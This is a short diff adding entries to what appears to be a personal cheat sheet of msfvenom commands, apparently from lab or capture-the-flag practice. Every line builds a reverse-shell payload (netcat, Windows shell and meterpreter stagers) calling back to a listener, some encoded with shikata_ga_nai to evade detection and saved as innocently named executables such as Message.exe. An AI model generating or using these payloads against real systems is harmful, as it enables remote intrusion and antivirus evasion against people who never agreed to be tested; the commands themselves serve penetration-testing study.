@@ -1,3 +1,5 @@
 # msfvenom payloads
 msfvenom -p cmd/unix/reverse_netcat lhost=10.8.23.159 lport=4444 R
 msfvenom -p windows/shell/reverse_tcp LHOST=10.8.50.72 LPORT=9999 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.41.181 LPORT=443 -f exe -o Message.exe
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
